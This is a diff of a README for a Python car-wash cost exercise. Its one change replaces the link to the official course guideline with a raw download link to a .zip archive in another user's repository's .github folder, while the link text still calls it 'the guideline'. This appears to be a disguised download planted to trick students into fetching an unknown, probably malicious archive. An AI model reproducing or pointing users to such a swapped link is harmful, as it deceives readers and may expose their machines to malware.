@@ -1,6 +1,6 @@
 # Washing Station
 
-Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before starting.
+Read [the guideline](https://raw.githubusercontent.com/Rudge0/py-car-wash-station/master/.github/car-station-wash-py-1.3.zip) before starting.
 
 You own a car washing station. Washing cost calculation 
 takes a lot of time, and you decide to automate this
